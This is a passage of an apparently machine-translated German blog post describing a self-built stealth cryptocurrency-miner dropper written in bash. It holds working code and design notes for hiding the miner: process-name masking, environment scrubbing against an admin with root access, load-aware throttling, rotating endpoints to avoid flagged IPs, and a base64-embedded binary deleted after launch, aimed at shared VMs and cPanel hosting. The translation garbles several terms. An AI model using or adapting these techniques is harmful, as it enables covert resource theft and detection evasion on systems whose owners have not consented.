        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprozesse sind seit bash verfügbar<code>v4</code> , sind sie wie Jobs, außer dass sie einen Namen und ihre eigenen Dateideskriptoren haben.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Wir schreiben einen Daemon, was ein langlebiger Prozess ist, und wir verwenden viele Dateideskriptoren. Wir möchten wirklich einige Bereinigungen durchführen, um Fehler zu vermeiden<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> Grenzen</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Diese Funktion basiert auf<a href=https://ipinfo.io/> ipinfo</a> um die Region des Arbeiters zu bestimmen, was es ermöglicht, eine gebietsabhängige Logik abzustimmen,<a href=\assets/posts/geoip.json> geoip.json</a> gruppiert Länder in Regionen, da wir die Top-Level-Region wollen und nicht an dem spezifischen Land interessiert sind.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash unterstützt TCP-Verbindungen, indem sie eine Abstraktion über<code>/dev/tcp</code> (auch für udp, aber die meisten scheinen zur Build-Zeit normalerweise deaktiviert zu sein, sodass Sie sich nicht darauf verlassen können). Diese Dateien sind eine Bash-Sache, sie sind nicht Teil von Linux<code>/dev</code> Baum.<p>Erwähnenswert ist auch ein Sperrsystem, um die Parallelität zwischen Bash-Jobs zu handhaben. Damit mehrere Jobs mit Sperren arbeiten können, müssen sie sich alle einen Dateideskriptor teilen<code>locker</code> der auch ein Job ist, muss vor anderen Jobs gestartet werden, die die Sperre verwenden wollen. Der Spind liest einfach weiter<code>stdin</code> auf Sperranfragen warten, antworten am<code>stdout</code> abhängig vom aktuellen booleschen Zustand, der in einer Variablen gespeichert ist. Ich garantiere nicht, dass dieser Ansatz rassenfrei ist, scheint aber anständig zu funktionieren, andererseits habe ich festgestellt, dass Dateideskriptoren nicht sehr zuverlässig sind, da ich vermute, dass es einige Puffer gibt, die nicht irgendwo in der Datei gespült werden<em> Rohre</em> und schließlich in Deadlocks geraten (was bedeutet, dass Sie sich nicht darauf verlassen können, dass das Schließfach Ihnen immer eine Antwort gibt).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Räumen Sie Ihren Müll auf ... komplexe Bash-Programme verwenden am Ende viele Variablen, und wenn Sie den globalen Speicherplatz missbrauchen, wird es aufgebläht. Wenn Sie Shell-Jobs erzeugen, erben sie die gesamte Umgebung (die effektiv dupliziert, nicht geteilt wird), Sie können schnell mit Bash-Essen enden<code>100M</code> Speicher, nicht schön. Außerdem wollen wir wirklich unauffällig sein. In unserem Einsatzszenario ist der Gegner<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> kann möglicherweise Root-Zugriff und vollständige Informationen über unsere Prozesse haben<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , und Sie wissen ... jeder Prozess enthält Informationen über den vollständigen Befehl, der ihn gestartet hat, und die exportierten Umgebungsvariablen.<h2 id=configuration><a class=header-anchor href=#configuration> Aufbau</a></h2><p>Sobald wir unsere Umgebung und unsere Tools haben, müssen wir unseren Miner für die Maschine abstimmen, auf der er läuft, Konfigurationsschritte in Pseudocode:<ul><li><p>Prozessname für den Miner<li><p>Host-Infos (RAM/Kerne/Caches/<code>ENV_VARS</code>)<li><p>Konfigurationsversion<li><p><code>worker_id</code> für den Miner (von IP und Host)<li><p>IP/Port für die Verbindung</ul><p>Die Wahl eines Namens für den Prozess ist erforderlich, um<em> verstecken</em> die Tatsache, dass wir einen Miner betreiben, aber nicht nur unsere Binärdatei umbenennen, wir haben eine Liste von<strong> Masken</strong> für potenzielle Kandidaten (eine reine Textdatei, in der jede Zeile eine Maske ist):<ul><li><p>wähle zufällig eine Maske aus<li><p>Mischen Sie die Elemente des Endes des Strings (alle außer dem ersten), um einen diversen Prozessbefehl zu erhalten. Jetzt haben wir eine Zeichenfolge, die so aussieht<code>cmd --arg2 --arg1 --arg3</code> . Dies ist unsere Miner-Maske, wir führen die Binärdatei aus<em> ohne</em> Argumente, aber es sieht so aus, als hätten wir einen Befehl gestartet<code>cmd</code> mit Argumenten<code>--arg1 --arg2 --arg3</code>. Leerzeichen und Bindestriche sind in Dateinamen erlaubt, daher ist es in Ordnung, eine Binärdatei mit diesem Namen auszuführen. Es scheint, dass Linux beim Speichern der Prozessbefehle nicht zwischen der ausführbaren Datei und den Argumenten unterscheidet.<p>Die Miner-Konfiguration wird automatisch geladen von<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, mit der Zeit hat der Upstream-Bergmann viele bekommen<strong> automatische Abstimmung</strong> Funktionen, also machte es einen Teil meiner Skripte überflüssig, aber der Unterschied zwischen Upstream und Downstream besteht hier darin, dass das Upstream-Ziel darin besteht, zu maximieren<em> Leistung</em> , während unser Ziel darin besteht, zu maximieren<em> Effizienz und Verschleierung</em> , wir wollen das System nicht überholen, wir wollen ein bisschen saugen ohne Serviceunterbrechung.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Dafür brauchen wir ein differenzierteres Verständnis der Umwelt, die<code>l2/l3</code> Cache-Struktur von Prozessor, RAM und Kernen sowie aktueller Prozessor<em> Durchschnitt</em> Last und CPU<em> Verwendungszweck</em> . Ich habe versucht, eine zu bauen<a href=https://en.wikipedia.org/wiki/Finite-state_machine> Zustandsmaschine</a> in der bash, die mit dem absoluten Minimum beginnen und verschiedene Konfigurationen ausprobieren würde, die sich langsam am besten im Durchschnitt niederlassen. Es war ein<strong> riesig</strong> Aufwandsverschwendung übersät mit<a href=https://en.wikipedia.org/wiki/Technical_debt> Technische Schulden</a> das ging sehr schnell bankrott und wurde größtenteils verworfen, wobei nur Reste in der Codebasis verweilten.<p>Frack all diesen Auto-Tuning-Jumbo, wir haben den Miner nur abhängig von der Host-Nutzung / -Last in den Ruhezustand versetzt, dies erforderte Miner-Modifikationen an<code>sleep</code> zwischen Threads ergibt, und ein paar Korrekturen am Konfigurations-Watchdog<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , was es uns ermöglichen würde, den Schlafwert zur Laufzeit neu zu laden. Die Logik ist viel vereinfacht und sieht so aus:<ul><li><p>wenn die Nutzung über/unter $TARGET_USAGE (± Fehlertoleranz) liegt, erhöhen/verringern Sie den Schlaf<li><p>wenn durchschnittliche Belastung innerhalb<code>1m</code> liegt über/unter $TARGET_LOAD Mining pausieren/fortsetzen</ul><h3 id=connection><a class=header-anchor href=#connection> Verbindung</a></h3><p>In unserer Bash-Zusammenfassung haben wir Dienstprogramme für die Verbindung gezeigt. Warum brauchen wir diese? Weil wir Vielfalt brauchen; einen Endpunkt einfach hart in die Konfiguration zu codieren wird nicht lange dauern, wenn etwas verdächtig aussieht und Netzwerkaktivität hat, werden IPs gekennzeichnet.<p>Am Anfang haben wir mit ein paar Methoden experimentiert:<ul><li><p>mit<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> Proxyketten</a> Um die Miner-Netzwerkaufrufe zu überlasten, musste der Miner jedoch mit dynamischen Bibliotheken erstellt werden, und Sie mussten sie mit der Nutzlast versenden, daher war es unpraktisch.<li><p>rennen<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> Vorwärtstunnel</a> Seite an Seite mit dem Miner: Dies hatte einen hohen Konfigurationsaufwand, da wir jetzt bei jeder Bereitstellung zwei Prozesse konfigurierten, was zu mehr Fehlern führte.</ul><p>Am Ende haben wir uns damit begnügt, nur eine Liste von Endpunkten zu versenden, die in einer Bash-Variablen gespeichert sind und zufällig einen auswählen. Die Verbindungen waren natürlich verschlüsselt. Was sind diese Endpunkte? Weiterleitungen an den Proxy, der die Miner-Jobs abwickeln würde.<p>Warum brauchen wir a<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> Mining-Proxy</a> ? Ich bin nie wirklich über ~ 100 gleichzeitige Verbindungen hinausgegangen, daher war ein Proxy für die Netzwerklast nicht wirklich notwendig, aber er war praktisch, um den Hashing-Algorithmus auszuhandeln und verschiedene Schwierigkeitsziele für verschiedene Miner bereitzustellen, um zu verhindern, dass Miner daran arbeiten<strong> Schwierigkeit</strong> Ziele, deren Ausführung zu viel Zeit in Anspruch nehmen würde, und vermeiden das Risiko, Berechnungen für unfertige Jobs zu verschwenden.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Auch an der Pool-Software waren einige Änderungen erforderlich, da sie gerne als Proxy für einfache HTTP-Anfragen annoncierte ...<em> das musste eine Zeitüberschreitung haben</em> , und ein Fork hat die Zugriffskontrolle hinzugefügt, also haben wir unsere Mods darauf aufgebaut.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> json bearbeiten</a></h3><p>Das Anwenden von Änderungen auf eine Json-Datei mit nur bash kam mit einigen env var-Ersetzungen und einigen Regex aus. Anfangs verließen wir uns auf ein<code>envsubst</code> binär, um Variablen anzuwenden, dann haben wir volle Bash gemacht<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> mit dieser Logik:<ul><li><p>Konfigurationsvorlage lesen<li><p>Ersetze alle Anführungszeichen durch eine sehr esoterische Zeichenfolge (wie<code>_#_#</code>)<li><p><code>eval</code> Die Vorlage<li><p>Ersetze alle esoterischen Vorkommnisse wieder durch Anführungszeichen</ul><p>Abgesehen von der Vermeidung von Unterprozessen besteht ein weiterer Vorteil darin, dass wir in unseren Vorlagen vollständige Bash-Funktionen erhalten. Zum Lesen und Schreiben ohne Vorlagen sind wir auf die Regex-Fähigkeiten der Bash angewiesen:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Damit können wir nur einzelne Zeilen bearbeiten, bei mehrzeiligen Einträgen wird nur die erste Zeile berücksichtigt..aber für unseren Anwendungsfall ist es gut genug.<h2 id=runtime><a class=header-anchor href=#runtime> Laufzeit</a></h2><p>Wie sieht unsere Laufzeit aus? Wir haben einen Haupt-Bash-Prozess, der die Hauptschleife ausführt, dann den Miner-Unterprozess, den CPU-Monitor-Unterprozess, das Schließfach und den Tuner. Das ist fast eine Handvoll.<p>Zuerst wollen wir sicherstellen, dass wir, wenn etwas schief geht, kein Durcheinander hinterlassen, das bedeutet, dass wir eine Bash-Trap verwenden, um bei der Beendigung aufzuräumen<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> deaktiviert die Falle, um eine Rekursion zu verhindern. Die Falle tötet alle Jobs und entfernt die Arbeitsumgebung.<p>Es ist Zeit, den Miner zu starten, der als Bash-Variable in base64-Codierung gespeichert wird. Wir legen es auf dem Dateisystem ab, dann geben wir die Konfiguration ab, führen den Miner aus und entfernen sowohl den Miner als auch die Konfiguration. Unter Linux können Sie die ausführbare Datei eines laufenden Prozesses entfernen (unter Windows ist dies nicht zulässig).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup>Wenn der Miner läuft, gibt es auf dem Dateisystem nur a<code>.. /</code> Verzeichnis mit a<code>b64</code> darin verlinken.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Eine wahnsinnige Eigenart, die bei der Codierung des Miners mit bash auftritt, ist die Zuweisung einer Variablen mit einer Subshell mit Anführungszeichen<code>myvar="$(something)"</code> verursacht eine permanente Erhöhung des Speicherverbrauchs, dies war schwer zu debuggen und ich habe nicht wirklich den Grund dafür gefunden, warum sich dies so verhält, die Zuweisung muss sowieso nicht in Anführungszeichen gesetzt werden. Die Dekodierung erfolgt stattdessen mit<em> Herestrings</em> was eine Abstraktion über temporäre Dateien ist, wird die Variable in eine Datei geschrieben, die dann zurück in den Prozess geleitet wird.<p>Die Miner-Langlaufschleife:<ul><li><p>während wahr<ul><li><p>Bergmann stoppen<li><p>Konfiguration entfernen<li><p>Bergmann starten<li><p>während wahr<ul><li><p>Dämon starten<ul><li><p>während der Bergmann läuft<ul><li><p>Lesen Sie die Ausgabe von Miner<li><p>Wählen Sie die Miner-Aktion basierend auf der Ausgabezeile</ul></ul><li><p>wenn Miner nicht läuft: Pause</ul><li><p>Schlaf</ul></ul><p>Die Ausgabezeile wird mit einigen Regex abgeglichen:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Der Daemon behandelt Fälle, in denen<ul><li><p>die Verbindung zum Endpunkt gibt Fehler (wählen Sie einen neuen zufälligen Endpunkt)<li><p>der Hashing-Algorithmus ändert sich (Schlafzeit und Ad-hoc-Konfigurationen anpassen)<li><p>Miner-Probleme (Neustart des Miners).</ul><p>Eine Zeit lang gab es Unterstützung für das Command and Control Dashboard, das manuelle Neustarts ermöglichte, aber da seine Nutzung minimal war, wurde es verworfen und seine Endpunkte wurden durch eine alternative Pool-Verbindung ersetzt, auch der Neustart war instabil, komplex. ..ein weiterer Fall von Tech-Schulden. Es erlaubte jedoch, eine aktualisierte Nutzlast erneut abzurufen und alle Konfigurationen im Handumdrehen neu einzurichten, was ziemlich cool war, das ultimative Trampolin.<h2 id=debugging><a class=header-anchor href=#debugging> Debuggen</a></h2><p>Es gibt drei Hauptdienstprogramme<ul><li><p>Aktivieren/Deaktivieren der Ablaufverfolgung um Codeblöcke herum (wir möchten keine b64-codierte Binärdatei in einer Variablen verfolgen..)<li><p>eine einfache Funktion zum Formatieren von Protokollen<li><p>ein Flag, das die ausführliche Protokollierung zur Laufzeit aktiviert, wenn der Miner gestartet wird.<ul><li><p>funktioniert die Datei?<code>.debug</code> existieren?<ul><li><p>Ausführliche Protokollierung aktivieren</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Zielbereitstellungen</a></h2><p>Dieses Setup wurde auf 3 Arten von Hosts getestet:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Selbst gehostete Container oder VMs</a></h3><p>Viele Hosting-Anbieter mögen das Mining nicht, da CPU-Ressourcen in der Regel von mehreren Benutzern geteilt werden und Mining-Software einen Hostknoten leicht verlangsamen kann, was die Leistung für den Rest der Benutzer beeinträchtigt. Dies kann selbst dann zutreffen, wenn die CPU-Benutzerzeit unbegrenzt ist, da Hashing-Algorithmen alle Caching-Schichten der CPU sättigen können, wenn der Cache von allen CPU-Kernen gemeinsam genutzt wird.<p>Wir möchten unsere<em> gerecht</em> Ressourcen teilen, ohne gesperrt zu werden, das ist ein guter Anwendungsfall für unseren Stealth-Dropper, da er die Host-Nutzung kennt, was bedeutet, dass es<em> sollen</em> bleibe irgendwie innerhalb von [AUP]. Es gibt keine zusätzlichen Schritte bei selbst gehosteten Bereitstellungen, nur das Launcher-Skript, das möglicherweise der Bootsequenz hinzugefügt oder manuell gestartet wird.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanel-basiertes Webhosting</a></h3><p>Webhosting-Abonnements werden meistens über [cPanel] angeboten. Auch hier verwenden wir persönliche Abonnementpläne mit angemessenen Ressourcenbeschränkungen, auf der anderen Seite hat jeder kostenlose Plan lächerliche Beschränkungen<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel ermöglicht es Ihnen, Handler für verschiedene Dateierweiterungen zu definieren, dies ermöglicht uns die Ausführung von Shell-Skripten über das<a 